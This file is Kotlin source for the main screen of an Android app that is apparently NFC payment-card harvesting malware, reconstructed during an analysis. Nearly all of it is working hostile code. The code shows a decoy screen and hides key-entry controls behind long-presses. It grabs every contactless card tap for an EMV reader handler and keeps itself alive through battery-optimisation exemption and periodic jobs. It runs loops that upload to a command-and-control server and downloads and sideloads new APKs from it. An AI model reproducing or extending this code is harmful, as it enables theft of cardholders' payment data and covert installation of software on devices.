// orig: xyz/happify/ckemv/MainActivity.java
//   kept-name (declared in AndroidManifest)
//
// The only Activity. Does seven things in onCreate:
//   1. FLAG_KEEP_SCREEN_ON (so the NFC tap doesn't time out mid-session)
//   2. Hide action bar
//   3. Build the SQLite helper
//   4. Request battery-optimization whitelist (hostile UX)
//   5. Build the decoy UI programmatically
//   6. Schedule WorkManager periodic job (SyncWorker, 15 min)
//   7. Launch three coroutines: ProgressPump, UploadLoop, ConfigUpdateLoop
//
// Then wires NFC foreground dispatch so every contactless card tap reaches
// onNewIntent → NfcTapHandler.

package xyz.happify.ckemv

import android.app.AlertDialog
import android.app.PendingIntent
import android.content.ContentValues
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.IsoDep
import android.os.Bundle
import android.os.PowerManager
import android.view.Gravity
import android.view.View
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.result.ActivityResultLauncher
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.journeyapps.barcodescanner.ScanContract
import com.journeyapps.barcodescanner.ScanIntentResult
import com.journeyapps.barcodescanner.ScanOptions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import okhttp3.MediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import xyz.happify.ckemv.db.HarvestDatabaseHelper
import xyz.happify.ckemv.net.C2
import xyz.happify.ckemv.net.ConfigUpdateLoop
import xyz.happify.ckemv.net.UploadLoop
import xyz.happify.ckemv.nfc.NfcTapHandler
import xyz.happify.ckemv.ui.DecoyView
import xyz.happify.ckemv.ui.HideProgressBar
import xyz.happify.ckemv.ui.ProgressPump
import xyz.happify.ckemv.update.ApkSideloader
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    // ---- fields (preserved exact names from Phase B analysis) ----

    lateinit var dbHelper:     HarvestDatabaseHelper
    lateinit var progressBar:  ProgressBar

    /** MutableStateFlow pumped by NfcTapHandler (IO) → consumed by ProgressPump (Main). */
    val progressFlow = MutableStateFlow(0)

    private lateinit var actionArea:    LinearLayout    // right-side long-press target (QR scan)
    private lateinit var nfcAdapter:    NfcAdapter
    private lateinit var nfcIntent:     PendingIntent
    private var updateInProgress = false                // re-entrancy guard for self-update

    private lateinit var qrLauncher: ActivityResultLauncher<ScanOptions>

    // ---------------------------------------------------------------

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. Keep screen on during long tap sessions.
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        // 2. Hide the action bar.
        supportActionBar?.hide()

        // 3. SQLite helper.
        dbHelper = HarvestDatabaseHelper(this)

        // 4. Battery optimization whitelist (hostile UX — pops an OS dialog).
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            startActivity(Intent(
                android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                android.net.Uri.parse("package:$packageName")
            ))
        }

        // 5. Build decoy UI programmatically.
        //    Dark root → top row (paste-key label + QR zone) → progress bar → decoy view.
        val root = LinearLayout(this).apply {
            orientation  = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#121212"))
        }

        val topRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
        }

        // Long-press on this label → "Manual Key Update" paste dialog.
        val keyLabel = TextView(this).apply {
            text = ""
            setOnLongClickListener {
                showPasteKeyDialog()
                true
            }
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        // Long-press on this zone → QR scanner for API key.
        actionArea = LinearLayout(this).apply {
            setOnLongClickListener {
                launchQrScanner()
                true
            }
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        topRow.addView(keyLabel)
        topRow.addView(actionArea)

        // 8-px green progress bar (initially hidden).
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            progressTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#00E676"))
            visibility = View.INVISIBLE
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 8)
        }

        // Decoy constellation view fills the rest of the screen.
        val decoyView = DecoyView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f)
        }

        root.addView(topRow)
        root.addView(progressBar)
        root.addView(decoyView)
        setContentView(root)

        // Register QR result callback (ZXing).
        qrLauncher = registerForActivityResult(ScanContract()) { result: ScanIntentResult ->
            val decoded = result.contents ?: return@registerForActivityResult
            val cv = ContentValues().apply { put("api_key", decoded) }
            dbHelper.writableDatabase.update("stats", cv, "id = 1", null)
        }

        // 6. WorkManager periodic job — 15 minutes, keep-alive if already running.
        val workReq = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "CkemvSyncWork",
            ExistingPeriodicWorkPolicy.KEEP,
            workReq
        )

        // 7. Launch three background coroutines.
        lifecycleScope.launch(Dispatchers.Main) { ProgressPump(this@MainActivity)() }
        lifecycleScope.launch(Dispatchers.IO)   { UploadLoop(this@MainActivity)() }
        lifecycleScope.launch(Dispatchers.IO)   { ConfigUpdateLoop(this@MainActivity)() }

        // 8. Wire NFC foreground dispatch.
        nfcAdapter = NfcAdapter.getDefaultAdapter(this)
        val selfIntent = Intent(this, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
        }
        nfcIntent = PendingIntent.getActivity(
            this, 0, selfIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
    }

    override fun onResume() {
        super.onResume()
        // Claim all NFC technology for this activity (IsoDep for EMV cards,
        // plus a catch-all filter so nothing escapes to another handler).
        val filters = arrayOf(
            IntentFilter(NfcAdapter.ACTION_TAG_DISCOVERED),
            IntentFilter(NfcAdapter.ACTION_TECH_DISCOVERED),
            IntentFilter(NfcAdapter.ACTION_NDEF_DISCOVERED).apply {
                addDataType("*/*")
            }
        )
        val tech = arrayOf(arrayOf(IsoDep::class.java.name))
        nfcAdapter.enableForegroundDispatch(this, nfcIntent, filters, tech)
    }

    override fun onPause() {
        super.onPause()
        nfcAdapter.disableForegroundDispatch(this)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        val action = intent.action ?: return
        if (action !in setOf(
                NfcAdapter.ACTION_TAG_DISCOVERED,
                NfcAdapter.ACTION_TECH_DISCOVERED,
                NfcAdapter.ACTION_NDEF_DISCOVERED)) return

        val tag: Tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) ?: run {
            // Empty intent (no real tag) — NFC dispatch sometimes fires without a tag.
            return
        }

        val isoDep = IsoDep.get(tag) ?: return   // not an ISO-DEP card; ignore

        lifecycleScope.launch(Dispatchers.IO) {
            NfcTapHandler(this@MainActivity, isoDep)()
        }
    }

    // ---- Long-press handler: paste API key ----

    private fun showPasteKeyDialog() {
        val input = EditText(this)
        AlertDialog.Builder(this)
            .setTitle("Manual Key Update")
            .setView(input)
            .setPositiveButton("UPDATE") { _, _ ->
                val key = input.text.toString().trim()
                if (key.isNotEmpty()) {
                    val cv = ContentValues().apply { put("api_key", key) }
                    dbHelper.writableDatabase.update("stats", cv, "id = 1", null)
                }
            }
            .show()
    }

    // ---- Long-press handler: QR scan for API key ----

    private fun launchQrScanner() {
        val opts = ScanOptions().apply {
            setDesiredBarcodeFormats(ScanOptions.QR_CODE)
            setPrompt("Scan Collector API Key")
            setBeepEnabled(true)
            setCameraId(0)
            setOrientationLocked(false)
            setBarcodeImageEnabled(false)
        }
        qrLauncher.launch(opts)
    }

    // ---- Static utility: hex ↔ bytes (used by NfcTapHandler) ----

    companion object {
        @JvmStatic
        fun bytesToHex(bytes: ByteArray): String =
            bytes.joinToString("") { "%02X".format(it) }

        @JvmStatic
        fun hexToBytes(hex: String): ByteArray =
            ByteArray(hex.length / 2) { hex.substring(it * 2, it * 2 + 2).toInt(16).toByte() }

        /**
         * Self-update downloader. Called from ConfigUpdateLoop when the C2
         * advertises a version newer than the build's hard-coded 1.7.
         *
         * 1. POSTs {"api_key":"..."} to /update_apk (via bundled OkHttp).
         * 2. Streams response body to externalFilesDir(DOWNLOADS)/update_v{version}.apk.
         * 3. Hands the file to ApkSideloader to fire the install intent.
         *
         * The `updateInProgress` flag prevents re-entrant downloads.
         */
        @JvmStatic
        suspend fun downloadSelfUpdate(activity: MainActivity, apiKey: String, version: String) {
            if (activity.updateInProgress) return
            activity.updateInProgress = true
            try {
                val body = RequestBody.create(
                    MediaType.get("application/json"),
                    """{"api_key":"$apiKey"}"""
                )
                val req = Request.Builder()
                    .url("${C2.BASE_URL}/update_apk")
                    .post(body)
                    .build()

                val resp = OkHttpClient().newCall(req).execute()
                if (resp.isSuccessful) {
                    val outDir = activity.getExternalFilesDir(android.os.Environment.DIRECTORY_DOWNLOADS)
                    val outFile = File(outDir, "update_v$version.apk")
                    resp.body()?.byteStream()?.use { input ->
                        FileOutputStream(outFile).use { output ->
                            val buf = ByteArray(8192)
                            var len: Int
                            while (input.read(buf).also { len = it } != -1) {
                                output.write(buf, 0, len)
                            }
                        }
                    }
                    // Switch to Main to call startActivity.
                    kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                        ApkSideloader(activity, outFile)()
                    }
                }
            } catch (_: Exception) {
                // Failure is silent — ConfigUpdateLoop will retry on next 60 s tick.
            } finally {
                activity.updateInProgress = false
            }
        }
    }
}
